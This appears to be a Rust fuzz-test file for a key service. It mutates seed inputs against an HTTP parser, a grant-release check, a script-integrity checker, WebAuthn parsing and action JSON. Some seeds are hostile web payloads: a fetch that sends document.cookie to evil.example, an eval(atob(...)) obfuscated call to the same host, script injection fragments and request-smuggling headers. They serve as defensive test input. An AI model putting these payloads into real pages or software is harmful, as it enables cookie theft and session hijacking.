//! Randomized fuzzing on stable Rust: structured inputs plus byte-level mutations of them, through
//! the same entry points (and invariants) as the libFuzzer targets in fuzz/.
//!   cargo test --release --test fuzz_props            (FUZZ_ITERS per target, default 20 000)
//!   FUZZ_ITERS=2000000 cargo test --release --test fuzz_props

use mastyf_keyservice::fuzzing;

struct Rng(u64);
impl Rng {
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 << 13;
        self.0 ^= self.0 >> 7;
        self.0 ^= self.0 << 17;
        self.0
    }
    fn below(&mut self, n: usize) -> usize {
        (self.next() % n.max(1) as u64) as usize
    }
    fn pick<'a>(&mut self, xs: &'a [&'a [u8]]) -> &'a [u8] {
        xs[self.below(xs.len())]
    }
}

fn iters() -> usize {
    std::env::var("FUZZ_ITERS").ok().and_then(|v| v.parse().ok()).unwrap_or(20_000)
}

const TOKENS: &[&[u8]] = &[
    b"\r\n", b"\r\n\r\n", b"\n", b":", b" ", b"\0", b"\xff", b"{", b"}", b"[", b"]", b"\"", b",", b"0", b"-1",
    b"99999999999999999999", b"1e400", b"Content-Length: ", b"content-length:", b"Transfer-Encoding: chunked",
    b"Authorization: Bearer ", b"Connection: close", b"GET ", b"POST ", b"HTTP/1.1", b"HTTP/1.0", b"/v1/decide",
    b"\"identity\"", b"\"grant\"", b"\"action\"", b"\"overrun\"", b"\"approver\"", b"\"sig\"", b"\"ad\"", b"\"cd\"",
    b"\"type\":\"webauthn.get\"", b"\"challenge\"", b"eval(", b"fetch(\"https://evil.example/x\")", b"<script>",
    b"document.cookie", b"atob(", b"\\u0000", b"\\x41", b"//", b"/*", b"*/", b"`${", b"}`",
];

fn mutate(rng: &mut Rng, seed: &[u8]) -> Vec<u8> {
    let mut b = seed.to_vec();
    for _ in 0..1 + rng.below(8) {
        let i = if b.is_empty() { 0 } else { rng.below(b.len() + 1) };
        match rng.below(6) {
            0 if !b.is_empty() => { let j = rng.below(b.len()); b[j] = rng.next() as u8; }
            1 => { let t = rng.pick(TOKENS); b.splice(i..i, t.iter().copied()); }
            2 if !b.is_empty() => { let e = (i + 1 + rng.below(16)).min(b.len()); if i < e { b.drain(i..e); } }
            3 if !b.is_empty() => { let e = (i + rng.below(64)).min(b.len()); let s: Vec<u8> = b[i.min(e)..e].to_vec(); b.splice(i..i, s); }
            4 => { let n = rng.below(32); b.splice(i..i, (0..n).map(|_| rng.next() as u8)); }
            _ => {}
        }
    }
    b
}

fn run(name: &str, seeds: &[&[u8]], f: fn(&[u8]), seed: u64) {
    let mut rng = Rng(seed);
    let n = iters();
    let t0 = std::time::Instant::now();
    let mut slowest = std::time::Duration::ZERO;
    for i in 0..n {
        let base = seeds[i % seeds.len()];
        let input = if i % 10 == 0 { (0..rng.below(512)).map(|_| rng.next() as u8).collect() } else { mutate(&mut rng, base) };
        let t = std::time::Instant::now();
        let r = std::panic::catch_unwind(|| f(&input));
        slowest = slowest.max(t.elapsed());
        if r.is_err() {
            panic!("{name}: finding on input {:?}", String::from_utf8_lossy(&input));
        }
    }
    eprintln!("{name}: {n} inputs in {:.1} s, slowest {:.2} ms", t0.elapsed().as_secs_f64(), slowest.as_secs_f64() * 1e3);
    assert!(slowest < std::time::Duration::from_millis(250), "{name}: an input took {slowest:?}");
}

#[test]
fn http_parser() {
    run("http", &[
        b"GET /healthz HTTP/1.1\r\nHost: x\r\n\r\n",
        b"POST /v1/decide HTTP/1.1\r\nHost: x\r\nAuthorization: Bearer k\r\nContent-Length: 27\r\n\r\n{\"action\":{\"identity\":\"x\"}}",
        b"POST /v1/decide HTTP/1.1\r\nContent-Length: 5\r\nContent-Length: 6\r\n\r\nhello!",
        b"POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\n",
        b"GET /a HTTP/1.1\r\n\r\nGET /b HTTP/1.1\r\nConnection: close\r\n\r\n",
    ], fuzzing::http, 0x9e3779b97f4a7c15);
}

#[test]
fn keyservice_release() {
    run("keyservice", &[
        br#"{"grant":"eyJhIjoxfQ.c2ln","action":{"identity":"human:alice","action_type":"data.read","resource":"db://crm/customers/1","count":10,"ts":1},"overrun":[{"approver":"human:dana","amount":100,"sig":"AAAA"}]}"#,
        br#"{"grant":"","action":{"identity":"svc:backup","action_type":"data.export","resource":"fs://prod/x","count":99999999,"destination":"s3://corp-warehouse","ts":1e300}}"#,
        b"eyJnaWQiOiJ4In0.AAAA",
    ], fuzzing::keyservice, 0xdeadbeefcafebabe);
}

#[test]
fn script_integrity() {
    run("script", &[
        b"function a(){return 1}\0function a(){return fetch('https://evil.example/'+document.cookie)}",
        b"var s=document.createElement('script');s.src='https://cdn.corp.example/x.js'",
        b"eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXZpbC5leGFtcGxlJyk='))",
    ], fuzzing::script_check, 0x1234_5678_9abc_def1);
}

#[test]
fn passkey_assertions() {
    run("webauthn", &[
        br#"{"ad":"AAAA","cd":"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQVFFQiJ9","sig":"AAAA"}"#,
        br#"{"ad":"","cd":"","sig":""}"#,
    ], fuzzing::webauthn, 0x0f0f_f0f0_1357_2468);
}

#[test]
fn action_json() {
    run("action", &[
        br#"{"identity":"human:alice","action_type":"data.read","resource":"db://x","count":1,"destination":null,"ts":1.5,"metadata":{}}"#,
        br#"{"identity":["a"],"count":-5,"ts":"now"}"#,
    ], fuzzing::action, 0x2468_ace0_1357_9bdf);
}
